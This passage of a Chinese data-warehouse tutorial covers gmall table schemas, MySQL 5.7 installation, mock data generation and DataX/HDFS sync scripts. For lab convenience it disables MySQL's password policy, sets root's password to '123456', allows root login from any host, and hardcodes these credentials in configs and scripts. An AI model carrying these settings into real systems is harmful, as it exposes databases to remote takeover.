id="SPU销售属性表（spu-sale-attr）"><a href="#SPU销售属性表（spu-sale-attr）" class="headerlink" title="SPU销售属性表（spu_sale_attr）"></a>SPU销售属性表（spu_sale_attr）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号(业务中无关联)</td></tr><tr><td>spu_id</td><td>商品id</td></tr><tr><td>base_sale_attr_id</td><td>销售属性id</td></tr><tr><td>sale_attr_name</td><td>销售属性名称(冗余)</td></tr></tbody></table><h4 id="SPU销售属性值表（spu-sale-attr-value）"><a href="#SPU销售属性值表（spu-sale-attr-value）" class="headerlink" title="SPU销售属性值表（spu_sale_attr_value）"></a>SPU销售属性值表（spu_sale_attr_value）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>销售属性值编号</td></tr><tr><td>spu_id</td><td>商品id</td></tr><tr><td>base_sale_attr_id</td><td>销售属性id</td></tr><tr><td>sale_attr_value_name</td><td>销售属性值名称</td></tr><tr><td>sale_attr_name</td><td>销售属性名称(冗余)</td></tr></tbody></table><h4 id="用户地址表（user-address）"><a href="#用户地址表（user-address）" class="headerlink" title="用户地址表（user_address）"></a>用户地址表（user_address）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>user_id</td><td>用户id</td></tr><tr><td>province_id</td><td>省份id</td></tr><tr><td>user_address</td><td>用户地址</td></tr><tr><td>consignee</td><td>收件人</td></tr><tr><td>phone_num</td><td>联系方式</td></tr><tr><td>is_default</td><td>是否是默认</td></tr></tbody></table><h4 id="用户信息表（user-info）"><a href="#用户信息表（user-info）" class="headerlink" title="用户信息表（user_info）"></a>用户信息表（user_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>login_name</td><td>用户名称</td></tr><tr><td>nick_name</td><td>用户昵称</td></tr><tr><td>passwd</td><td>用户密码</td></tr><tr><td>name</td><td>用户姓名</td></tr><tr><td>phone_num</td><td>手机号</td></tr><tr><td>email</td><td>邮箱</td></tr><tr><td>head_img</td><td>头像</td></tr><tr><td>user_level</td><td>用户级别</td></tr><tr><td>birthday</td><td>用户生日</td></tr><tr><td>gender</td><td>性别 M男,F女</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>operate_time</td><td>修改时间</td></tr><tr><td>status</td><td>状态</td></tr></tbody></table><h3 id="模拟生成业务数据"><a href="#模拟生成业务数据" class="headerlink" title="模拟生成业务数据"></a>模拟生成业务数据</h3><h4 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h4><p><strong>1）安装包准备</strong></p><p><strong>（1）卸载自带的Mysql-libs（如果之前安装过mysql，要全都卸载掉）</strong></p><p>[atguigu@hadoop102 software]$ rpm -qa | grep -i -E mysql\|mariadb | xargs<br>-n1 sudo rpm -e –nodeps</p><p><strong>（2）将安装包和JDBC驱动上传到/opt/software，共计6个</strong></p><p>01_mysql-community-common-5.7.16-1.el7.x86_64.rpm</p><p>02_mysql-community-libs-5.7.16-1.el7.x86_64.rpm</p><p>03_mysql-community-libs-compat-5.7.16-1.el7.x86_64.rpm</p><p>04_mysql-community-client-5.7.16-1.el7.x86_64.rpm</p><p>05_mysql-community-server-5.7.16-1.el7.x86_64.rpm</p><p>mysql-connector-java-5.1.27-bin.jar</p><p><strong>2）安装MySQL</strong></p><p><strong>（1）安装mysql依赖</strong></p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>01_mysql-community-common-5.7.16-1.el7.x86_64.rpm</p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>02_mysql-community-libs-5.7.16-1.el7.x86_64.rpm</p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>03_mysql-community-libs-compat-5.7.16-1.el7.x86_64.rpm</p><p><strong>（2）安装mysql-client</strong></p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>04_mysql-community-client-5.7.16-1.el7.x86_64.rpm</p><p><strong>（3）安装mysql-server</strong></p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>05_mysql-community-server-5.7.16-1.el7.x86_64.rpm</p><p><strong>（4）启动mysql</strong></p><p>[atguigu@hadoop102 software]$ sudo systemctl start mysqld</p><p><strong>（5）查看mysql密码</strong></p><p>[atguigu@hadoop102 software]$ sudo cat /var/log/mysqld.log | grep password</p><p><strong>3）配置MySQL</strong></p><p>配置只要是root用户+密码，在任何主机上都能登录MySQL数据库。</p><p><strong>（1）用刚刚查到的密码进入mysql（如果报错，给密码加单引号）</strong></p><p>[atguigu@hadoop102 software]$ mysql -uroot -p’password’</p><p><strong>（2）设置复杂密码(由于mysql密码策略，此密码必须足够复杂)</strong></p><p>mysql&gt; set password=password(“Qs23=zs32”);</p><p><strong>（3）更改mysql密码策略</strong></p><p>mysql&gt; set global validate_password_length=4;</p><p>mysql&gt; set global validate_password_policy=0;</p><p><strong>（4）设置简单好记的密码</strong></p><p>mysql&gt; set password=password(“123456”);</p><p><strong>（5）进入msyql库</strong></p><p>mysql&gt; use mysql</p><p><strong>（6）查询user表</strong></p><p>mysql&gt; select user, host from user;</p><p><strong>（7）修改user表，把Host表内容修改为%</strong></p><p>mysql&gt; update user set host=”%” where user=”root”;</p><p><strong>（8）刷新</strong></p><p>mysql&gt; flush privileges;</p><p><strong>（9）退出</strong></p><p>mysql&gt; quit;</p><h4 id="业务数据生成"><a href="#业务数据生成" class="headerlink" title="业务数据生成"></a>业务数据生成</h4><p><strong>1）连接MySQL</strong></p><p>通过MySQL可视化客户端连接数据库。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/e6d30df4632678c5074c181e254ea131.png"></p><p><strong>2）建表语句</strong></p><p>（1）通过SQLyog创建数据库</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/608c561af4283cb360b540194ed9ca3a.png"></p><p>（2）设置数据库名称为<strong>gmall</strong>，编码为<strong>utf-8</strong>，<strong>排序规则</strong>为utf8_general_ci</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/a8fb4801bb8c3dbfdced378e4200fe47.png"></p><p>（3）导入数据库结构脚本（<strong>gmall.sql</strong>）</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/beab5148b90a7ffd3b230d60988e7561.png"></p><p>注意：完成后，要记得右键，刷新一下对象浏览器，就可以看见数据库中的表了。</p><p><strong>3）生成业务数据</strong></p><p>（1）在hadoop102的/opt/module/目录下创建db_log文件夹</p><p>[atguigu@hadoop102 module]$ mkdir db_log/</p><p>（2）把gmall2020-mock-db-2021-11-14.jar和application.properties上传到hadoop102的/opt/module/db_log路径上。</p><p>（3）根据需求修改application.properties相关配置</p><p>logging.level.root=info</p><p>spring.datasource.driver-class-name=com.mysql.jdbc.Driver</p><p>spring.datasource.url=jdbc:mysql://hadoop102:3306/gmall?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</p><p>spring.datasource.username=root</p><p>spring.datasource.password=123456</p><p>logging.pattern.console=%m%n</p><p>mybatis-plus.global-config.db-config.field-strategy=not_null</p><p>mybatis.mapperLocations=classpath:mapper/*.xml</p><p>##业务日期</p><p>mock.date=2020-06-14</p><p>##是否重置，首日须设置为1</p><p>mock.clear=1</p><p>##是否重置用户，首日须设置为1</p><p>mock.clear.user=1</p><p>##生成新用户数量</p><p>mock.user.count=200</p><p>##男性比例</p><p>mock.user.male-rate=20</p><p>##用户数据变化概率</p><p>mock.user.update-rate:20</p><p>##收藏取消比例</p><p>mock.favor.cancel-rate=10</p><p>##收藏数量</p><p>mock.favor.count=100</p><p>##每个用户添加购物车的概率</p><p>mock.cart.user-rate=10</p><p>##每次每个用户最多添加多少种商品进购物车</p><p>mock.cart.max-sku-count=8</p><p>##每个商品最多买几个</p><p>mock.cart.max-sku-num=3</p><p>##购物车来源 用户查询，商品推广，智能推荐, 促销活动</p><p>mock.cart.source-type-rate=60:20:10:10</p><p>##用户下单比例</p><p>mock.order.user-rate=30</p><p>##用户从购物中购买商品比例</p><p>mock.order.sku-rate=50</p><p>##是否参加活动</p><p>mock.order.join-activity=1</p><p>##是否使用购物券</p><p>mock.order.use-coupon=1</p><p>##购物券领取人数</p><p>mock.coupon.user-count=100</p><p>##支付比例</p><p>mock.payment.rate=70</p><p>##支付方式 支付宝：微信 ：银联</p><p>mock.payment.payment-type=30:60:10</p><p>##评价比例 好：中：差：自动</p><p>mock.comment.appraise-rate=30:10:10:50</p><p>##退款原因比例：质量问题 商品描述与实际描述不一致 缺货 号码不合适 拍错 不想买了<br>其他</p><p>mock.refund.reason-rate=30:10:20:5:15:5:5</p><p>logging.level.com.atguigu.gmall2020.mock.db.mapper=debug</p><p>（4）并在该目录下执行，如下命令，生成2020-06-14日期数据：</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p>（5）查看gmall数据库，观察是否有2020-06-14的数据出现</p><h4 id="业务数据梳理工具"><a href="#业务数据梳理工具" class="headerlink" title="业务数据梳理工具"></a>业务数据梳理工具</h4><p>可借助EZDML这款数据库设计工具，来辅助我们梳理复杂的业务表关系。</p><p><strong>1）下载地址</strong></p><p><a href="http://www.ezdml.com/download_cn.html">http://www.ezdml.com/download_cn.html</a></p><p><strong>2）使用说明</strong></p><p><strong>（1）新建模型</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/13c9f92549815e54873688c709a8a617.png"></p><p><strong>（2）命名模型</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/9c71f327282e0ac01057637ebf8b13af.png"></p><p><strong>（3）点击图标，选中模型</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/4e53f5f77851207982d863ee0319f736.png"></p><p><strong>（4）导入数据库</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/4788144b3bc4b90f08c4a3bbce7e142b.png"></p><p><strong>（5）配置数据库连接</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b4e9f0c09de5ab69fc308aac085004bf.png"></p><p><strong>（6）选择导入的表（标注红点的表不需要导入）</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/3a0264f0583c3c1c35d9b661fb5f98b8.png"></p><p><strong>（7）建立表关系</strong></p><p>第一步：点击选中主表（主键所在的表）</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/00565aa6006fa74c1aa1da5291bda3bc.png"></p><p>第二步：点击连接按钮</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b7f840e6e1b5d8aad421a43813286595.png"></p><p>第三步：点击从表，配置连接条件</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/5fd6523014bf249a216aab4b0ae0accf.png"></p><p>第四步：效果展示</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/3a8de202d869fc191401b8a8f9bdb185.png"></p><p><strong>3）使用技巧</strong></p><p><strong>（1）缩略图</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1f533040e32ff8a4b4c9925e5ccd7dab.png"></p><p><strong>（2）热键</strong></p><p>按住shift键，用鼠标点击表，进行多选，可实现批量移动</p><p>按住ctrl键，用鼠标圈选表，也可进行多选，实现批量移动</p><h2 id="第3章-业务数据采集模块"><a href="#第3章-业务数据采集模块" class="headerlink" title="第3章 业务数据采集模块"></a>第3章 业务数据采集模块</h2><h3 id="业务数据同步概述"><a href="#业务数据同步概述" class="headerlink" title="业务数据同步概述"></a>业务数据同步概述</h3><h4 id="数据同步策略概述"><a href="#数据同步策略概述" class="headerlink" title="数据同步策略概述"></a>数据同步策略概述</h4><p>业务数据是数据仓库的重要数据来源，我们需要每日定时从业务数据库中抽取数据，传输到数据仓库中，之后再对数据进行分析统计。</p><p>为保证统计结果的正确性，需要保证数据仓库中的数据与业务数据库是同步的，离线数仓的计算周期通常为天，所以数据同步周期也通常为天，即每天同步一次即可。</p><p>数据的同步策略有<strong>全量同步</strong>和<strong>增量同步</strong>。</p><p><strong>全量同步</strong>，就是每天都将业务数据库中的全部数据同步一份到数据仓库，这是保证两侧数据同步的最简单的方式。</p><p><strong>增量同步</strong>，就是每天只将业务数据中的新增及变化数据同步到数据仓库。采用每日增量同步的表，通常需要在首日先进行一次全量同步。</p><h4 id="数据同步策略选择"><a href="#数据同步策略选择" class="headerlink" title="数据同步策略选择"></a>数据同步策略选择</h4><p>两种策略都能保证数据仓库和业务数据库的数据同步，那应该如何选择呢？下面对两种策略进行简要对比。</p><table><thead><tr><th>同步策略</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>全量同步</td><td>逻辑简单</td><td>在某些情况下效率较低。例如某张表数据量较大，但是每天数据的变化比例很低，若对其采用每日全量同步，则会重复同步和存储大量相同的数据。</td></tr><tr><td>增量同步</td><td>效率高，无需同步和存储重复数据</td><td>逻辑复杂，需要将每日的新增及变化数据同原来的数据进行整合，才能使用</td></tr></tbody></table><p>根据上述对比，可以得出以下结论：</p><p>若业务表数据量比较大，且每天数据变化的比例比较低，这时应采用增量同步，否则可采用全量同步。</p><p>下图为各表同步策略：</p><p>注：由于后续数仓建模需要，cart_info需进行全量同步和增量同步，此处暂不解释，后续章节会作出解释。</p><h4 id="数据同步工具概述"><a href="#数据同步工具概述" class="headerlink" title="数据同步工具概述"></a>数据同步工具概述</h4><p>数据同步工具种类繁多，大致可分为两类，一类是以DataX、Sqoop为代表的基于Select查询的离线、批量同步工具，另一类是以Maxwell、Canal为代表的基于数据库数据变更日志（例如MySQL的binlog，其会实时记录所有的insert、update以及delete操作）的实时流式同步工具。</p><p>全量同步通常使用DataX、Sqoop等基于查询的离线同步工具。而增量同步既可以使用DataX、Sqoop等工具，也可使用Maxwell、Canal等工具，下面对增量同步不同方案进行简要对比。</p><table><thead><tr><th>增量同步方案</th><th>DataX/Sqoop</th><th>Maxwell/Canal</th></tr></thead><tbody><tr><td>对数据库的要求</td><td>原理是基于查询，故若想通过select查询获取新增及变化数据，就要求数据表中存在create_time、update_time等字段，然后根据这些字段获取变更数据。</td><td>要求数据库记录变更操作，例如MySQL需开启binlog。</td></tr><tr><td>数据的中间状态</td><td>由于是离线批量同步，故若一条数据在一天中变化多次，该方案只能获取最后一个状态，中间状态无法获取。</td><td>由于是实时获取所有的数据变更操作，所以可以获取变更数据的所有中间状态。</td></tr></tbody></table><p>本项目中，全量同步采用DataX，增量同步采用Maxwell。</p><h4 id="数据同步工具部署"><a href="#数据同步工具部署" class="headerlink" title="数据同步工具部署"></a>数据同步工具部署</h4><p><strong>1）DataX</strong></p><p><strong>2）Maxwell</strong></p><h3 id="全量表数据同步"><a href="#全量表数据同步" class="headerlink" title="全量表数据同步"></a>全量表数据同步</h3><h4 id="数据通道"><a href="#数据通道" class="headerlink" title="数据通道"></a>数据通道</h4><p>全量表数据由DataX从MySQL业务数据库直接同步到HDFS，具体数据流向如下图所示。</p><h4 id="DataX配置文件"><a href="#DataX配置文件" class="headerlink" title="DataX配置文件"></a>DataX配置文件</h4><p>我们需要为每张全量表编写一个DataX的json配置文件，此处以activity_info为例，配置文件内容如下：</p><p>{</p><p>“job”: {</p><p>“content”: [</p><p>{</p><p>“reader”: {</p><p>“name”: “mysqlreader”,</p><p>“parameter”: {</p><p>“column”: [</p><p>“id”,</p><p>“activity_name”,</p><p>“activity_type”,</p><p>“activity_desc”,</p><p>“start_time”,</p><p>“end_time”,</p><p>“create_time”</p><p>],</p><p>“connection”: [</p><p>{</p><p>“jdbcUrl”: [</p><p>“jdbc:mysql://hadoop102:3306/gmall”</p><p>],</p><p>“table”: [</p><p>“activity_info”</p><p>]</p><p>}</p><p>],</p><p>“password”: “123456”,</p><p>“splitPk”: “”,</p><p>“username”: “root”</p><p>}</p><p>},</p><p>“writer”: {</p><p>“name”: “hdfswriter”,</p><p>“parameter”: {</p><p>“column”: [</p><p>{</p><p>“name”: “id”,</p><p>“type”: “bigint”</p><p>},</p><p>{</p><p>“name”: “activity_name”,</p><p>“type”: “string”</p><p>},</p><p>{</p><p>“name”: “activity_type”,</p><p>“type”: “string”</p><p>},</p><p>{</p><p>“name”: “activity_desc”,</p><p>“type”: “string”</p><p>},</p><p>{</p><p>“name”: “start_time”,</p><p>“type”: “string”</p><p>},</p><p>{</p><p>“name”: “end_time”,</p><p>“type”: “string”</p><p>},</p><p>{</p><p>“name”: “create_time”,</p><p>“type”: “string”</p><p>}</p><p>],</p><p>“compress”: “gzip”,</p><p>“defaultFS”: “hdfs://hadoop102:8020”,</p><p>“fieldDelimiter”: “\t”,</p><p>“fileName”: “activity_info”,</p><p>“fileType”: “text”,</p><p>“path”: “<strong>${targetdir}</strong>“,</p><p>“writeMode”: “append”</p><p>}</p><p>}</p><p>}</p><p>],</p><p>“setting”: {</p><p>“speed”: {</p><p>“channel”: 1</p><p>}</p><p>}</p><p>}</p><p>}</p><p>注：由于目标路径包含一层日期，用于对不同天的数据加以区分，故path参数并未写死，需在提交任务时通过参数动态传入，参数名称为<strong>targetdir</strong>。</p><h4 id="DataX配置文件生成脚本"><a href="#DataX配置文件生成脚本" class="headerlink" title="DataX配置文件生成脚本"></a>DataX配置文件生成脚本</h4><p>方便起见，此处提供了DataX配置文件批量生成脚本，脚本内容及使用方式如下。</p><p><strong>1）在~/bin目录下创建gen_import_config.py脚本</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_import_config.py</p><p>脚本内容如下</p><p>## coding=utf-8</p><p>import json</p><p>import getopt</p><p>import os</p><p>import sys</p><p>import MySQLdb</p><p>##MySQL相关配置，需根据实际情况作出修改</p><p>mysql_host = “hadoop102”</p><p>mysql_port = “3306”</p><p>mysql_user = “root”</p><p>mysql_passwd = “123456”</p><p>##HDFS NameNode相关配置，需根据实际情况作出修改</p><p>hdfs_nn_host = “hadoop102”</p><p>hdfs_nn_port = “8020”</p><p>##生成配置文件的目标路径，可根据实际情况作出修改</p><p>output_path = “/opt/module/datax/job/import”</p><p>##获取mysql连接</p><p>def get_connection():</p><p>return MySQLdb.connect(host=mysql_host, port=int(mysql_port), user=mysql_user,<br>passwd=mysql_passwd)</p><p>##获取表格的元数据 包含列名和数据类型</p><p>def get_mysql_meta(database, table):</p><p>connection = get_connection()</p><p>cursor = connection.cursor()</p><p>sql = “SELECT COLUMN_NAME,DATA_TYPE from information_schema.COLUMNS WHERE<br>TABLE_SCHEMA=%s AND TABLE_NAME=%s ORDER BY ORDINAL_POSITION”</p><p>cursor.execute(sql, [database, table])</p><p>fetchall = cursor.fetchall()</p><p>cursor.close()</p><p>connection.close()</p><p>return fetchall</p><p>##获取mysql表的列名</p><p>def get_mysql_columns(database, table):</p><p>return map(lambda x: x[0], get_mysql_meta(database, table))</p><p>##将获取的元数据中mysql的数据类型转换为hive的数据类型 写入到hdfswriter中</p><p>def get_hive_columns(database, table):</p><p>def type_mapping(mysql_type):</p><p>mappings = {</p><p>“bigint”: “bigint”,</p><p>“int”: “bigint”,</p><p>“smallint”: “bigint”,</p><p>“tinyint”: “bigint”,</p><p>“decimal”: “string”,</p><p>“double”: “double”,</p><p>“float”: “float”,</p><p>“binary”: “string”,</p><p>“char”: “string”,</p><p>“varchar”: “string”,</p><p>“datetime”: “string”,</p><p>“time”: “string”,</p><p>“timestamp”: “string”,</p><p>“date”: “string”,</p><p>“text”: “string”</p><p>}</p><p>return mappings[mysql_type]</p><p>meta = get_mysql_meta(database, table)</p><p>return map(lambda x: {“name”: x[0], “type”: type_mapping(x[1].lower())}, meta)</p><p>##生成json文件</p><p>def generate_json(source_database, source_table):</p><p>job = {</p><p>“job”: {</p><p>“setting”: {</p><p>“speed”: {</p><p>“channel”: 3</p><p>},</p><p>“errorLimit”: {</p><p>“record”: 0,</p><p>“percentage”: 0.02</p><p>}</p><p>},</p><p>“content”: [{</p><p>“reader”: {</p><p>“name”: “mysqlreader”,</p><p>“parameter”: {</p><p>“username”: mysql_user,</p><p>“password”: mysql_passwd,</p><p>“column”: get_mysql_columns(source_database, source_table),</p><p>“splitPk”: “”,</p><p>“connection”: [{</p><p>“table”: [source_table],</p><p>“jdbcUrl”: [“jdbc:mysql://“ + mysql_host + “:” + mysql_port + “/“ +<br>source_database]</p><p>}]</p><p>}</p><p>},</p><p>“writer”: {</p><p>“name”: “hdfswriter”,</p><p>“parameter”: {</p><p>“defaultFS”: “hdfs://“ + hdfs_nn_host + “:” + hdfs_nn_port,</p><p>“fileType”: “text”,</p><p>“path”: “${targetdir}”,</p><p>“fileName”: source_table,</p><p>“column”: get_hive_columns(source_database, source_table),</p><p>“writeMode”: “append”,</p><p>“fieldDelimiter”: “\t”,</p><p>“compress”: “gzip”</p><p>}</p><p>}</p><p>}]</p><p>}</p><p>}</p><p>if not os.path.exists(output_path):</p><p>os.makedirs(output_path)</p><p>with open(os.path.join(output_path, “.”.join([source_database, source_table,<br>“json”])), “w”) as f:</p><p>json.dump(job, f)</p><p>def main(args):</p><p>source_database = “”</p><p>source_table = “”</p><p>options, arguments = getopt.getopt(args, ‘-d:-t:’, [‘sourcedb=’, ‘sourcetbl=’])</p><p>for opt_name, opt_value in options:</p><p>if opt_name in (‘-d’, ‘–sourcedb’):</p><p>source_database = opt_value</p><p>if opt_name in (‘-t’, ‘–sourcetbl’):</p><p>source_table = opt_value</p><p>generate_json(source_database, source_table)</p><p>if _<em>name</em>_ == ‘<strong>main</strong>‘:</p><p>main(sys.argv[1:])</p><p><strong>注：</strong></p><p><strong>（1）安装Python Mysql驱动</strong></p><p><strong>由于需要使用Python访问Mysql数据库，故需安装驱动，命令如下：</strong></p><p>[atguigu@hadoop102 bin]$ sudo yum install -y MySQL-python</p><p><strong>（2）脚本使用说明</strong></p><p>python gen_import_config.py <strong>-d</strong> database <strong>-t</strong> table</p><p>通过-d传入数据库名，-t传入表名，执行上述命令即可生成该表的DataX同步配置文件。</p><p><strong>2）在~/bin目录下创建gen_import_config.sh脚本</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_import_config.sh</p><p>脚本内容如下</p><p>##!/bin/bash</p><p>python ~/bin/gen_import_config.py -d gmall -t activity_info</p><p>python ~/bin/gen_import_config.py -d gmall -t activity_rule</p><p>python ~/bin/gen_import_config.py -d gmall -t base_category1</p><p>python ~/bin/gen_import_config.py -d gmall -t base_category2</p><p>python ~/bin/gen_import_config.py -d gmall -t base_category3</p><p>python ~/bin/gen_import_config.py -d gmall -t base_dic</p><p>python ~/bin/gen_import_config.py -d gmall -t base_province</p><p>python ~/bin/gen_import_config.py -d gmall -t base_region</p><p>python ~/bin/gen_import_config.py -d gmall -t base_trademark</p><p>python ~/bin/gen_import_config.py -d gmall -t cart_info</p><p>python ~/bin/gen_import_config.py -d gmall -t coupon_info</p><p>python ~/bin/gen_import_config.py -d gmall -t sku_attr_value</p><p>python ~/bin/gen_import_config.py -d gmall -t sku_info</p><p>python ~/bin/gen_import_config.py -d gmall -t sku_sale_attr_value</p><p>python ~/bin/gen_import_config.py -d gmall -t spu_info</p><p><strong>3）为gen_import_config.sh脚本增加执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/gen_import_config.sh</p><p><strong>4）执行gen_import_config.sh脚本，生成配置文件</strong></p><p>[atguigu@hadoop102 bin]$ gen_import_config.sh</p><p><strong>5）观察生成的配置文件</strong></p><p>[atguigu@hadoop102 bin]$ ll /opt/module/datax/job/import/</p><p>总用量 60</p><p>-rw-rw-r– 1 atguigu atguigu 957 10月 15 22:17 gmall.activity_info.json</p><p>-rw-rw-r– 1 atguigu atguigu 1049 10月 15 22:17 gmall.activity_rule.json</p><p>-rw-rw-r– 1 atguigu atguigu 651 10月 15 22:17 gmall.base_category1.json</p><p>-rw-rw-r– 1 atguigu atguigu 711 10月 15 22:17 gmall.base_category2.json</p><p>-rw-rw-r– 1 atguigu atguigu 711 10月 15 22:17 gmall.base_category3.json</p><p>-rw-rw-r– 1 atguigu atguigu 835 10月 15 22:17 gmall.base_dic.json</p><p>-rw-rw-r– 1 atguigu atguigu 865 10月 15 22:17 gmall.base_province.json</p><p>-rw-rw-r– 1 atguigu atguigu 659 10月 15 22:17 gmall.base_region.json</p><p>-rw-rw-r– 1 atguigu atguigu 709 10月 15 22:17 gmall.base_trademark.json</p><p>-rw-rw-r– 1 atguigu atguigu 1301 10月 15 22:17 gmall.cart_info.json</p><p>-rw-rw-r– 1 atguigu atguigu 1545 10月 15 22:17 gmall.coupon_info.json</p><p>-rw-rw-r– 1 atguigu atguigu 867 10月 15 22:17 gmall.sku_attr_value.json</p><p>-rw-rw-r– 1 atguigu atguigu 1121 10月 15 22:17 gmall.sku_info.json</p><p>-rw-rw-r– 1 atguigu atguigu 985 10月 15 22:17 gmall.sku_sale_attr_value.json</p><p>-rw-rw-r– 1 atguigu atguigu 811 10月 15 22:17 gmall.spu_info.json</p><h4 id="测试生成的DataX配置文件"><a href="#测试生成的DataX配置文件" class="headerlink" title="测试生成的DataX配置文件"></a>测试生成的DataX配置文件</h4><p>以activity_info为例，测试用脚本生成的配置文件是否可用。</p><p><strong>1）创建目标路径</strong></p><p>由于DataX同步任务要求目标路径提前存在，故需手动创建路径，当前activity_info表的目标路径应为/origin_data/gmall/db/activity_info_full/2020-06-14。</p><p>[atguigu@hadoop102 bin]$ hadoop fs -mkdir<br>/origin_data/gmall/db/activity_info_full/2020-06-14</p><p><strong>2）执行DataX同步命令</strong></p><p>[atguigu@hadoop102 bin]$ python /opt/module/datax/bin/datax.py<br>-p”-Dtargetdir=/origin_data/gmall/db/activity_info_full/2020-06-14”<br>/opt/module/datax/job/import/gmall.activity_info.json</p><p><strong>3）观察同步结果</strong></p><p>观察HFDS目标路径是否出现数据。</p><h4 id="全量表数据同步脚本"><a href="#全量表数据同步脚本" class="headerlink" title="全量表数据同步脚本"></a>全量表数据同步脚本</h4><p>为方便使用以及后续的任务调度，此处编写一个全量表数据同步脚本。</p><p><strong>1）在~/bin目录创建mysql_to_hdfs_full.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/mysql_to_hdfs_full.sh</p><p>脚本内容如下</p><p>##!/bin/bash</p><p>DATAX_HOME=/opt/module/datax</p><p>## 如果传入日期则do_date等于传入的日期，否则等于前一天日期</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>##处理目标路径，此处的处理逻辑是，如果目标路径不存在，则创建；若存在，则清空，目的是保证同步任务可重复执行</p><p>handle_targetdir() {</p><p>hadoop fs -test -e $1</p><p>if [[ $? -eq 1 ]]; then</p><p>echo “路径$1不存在，正在创建……”</p><p>hadoop fs -mkdir -p $1</p><p>else</p><p>echo “路径$1已经存在”</p><p>fs_count=$(hadoop fs -count $1)</p><p>content_size=$(echo $fs_count | awk ‘{print $3}’)</p><p>if [[ $content_size -eq 0 ]]; then</p><p>echo “路径$1为空”</p><p>else</p><p>echo “路径$1不为空，正在清空……”</p><p>hadoop fs -rm -r -f $1/*</p><p>fi</p><p>fi</p><p>}</p><p>##数据同步</p><p>import_data() {</p><p>datax_config=$1</p><p>target_dir=$2</p><p>handle_targetdir $target_dir</p><p>python $DATAX_HOME/bin/datax.py -p”-Dtargetdir=$target_dir” $datax_config</p><p>}</p><p>case $1 in</p><p>“activity_info”)</p><p>import_data /opt/module/datax/job/import/gmall.activity_info.json<br>/origin_data/gmall/db/activity_info_full/$do_date</p><p>;;</p><p>“activity_rule”)</p><p>import_data /opt/module/datax/job/import/gmall.activity_rule.json<br>/origin_data/gmall/db/activity_rule_full/$do_date</p><p>;;</p><p>“base_category1”)</p><p>import_data /opt/module/datax/job/import/gmall.base_category1.json<br>/origin_data/gmall/db/base_category1_full/$do_date</p><p>;;</p><p>“base_category2”)</p><p>import_data /opt/module/datax/job/import/gmall.base_category2.json<br>/origin_data/gmall/db/base_category2_full/$do_date</p><p>;;</p><p>“base_category3”)</p><p>import_data /opt/module/datax/job/import/gmall.base_category3.json<br>/origin_data/gmall/db/base_category3_full/$do_date</p><p>;;</p><p>“base_dic”)</p><p>import_data /opt/module/datax/job/import/gmall.base_dic.json<br>/origin_data/gmall/db/base_dic_full/$do_date</p><p>;;</p><p>“base_province”)</p><p>import_data /opt/module/datax/job/import/gmall.base_province.json<br>/origin_data/gmall/db/base_province_full/$do_date</p><p>;;</p><p>“base_region”)</p><p>import_data /opt/module/datax/job/import/gmall.base_region.json<br>/origin_data/gmall/db/base_region_full/$do_date</p><p>;;</p><p>“base_trademark”)</p><p>import_data /opt/module/datax/job/import/gmall.base_trademark.json<br>/origin_data/gmall/db/base_trademark_full/$do_date</p><p>;;</p><p>“cart_info”)</p><p>import_data /opt/module/datax/job/import/gmall.cart_info.json<br>/origin_data/gmall/db/cart_info_full/$do_date</p><p>;;</p><p>“coupon_info”)</p><p>import_data 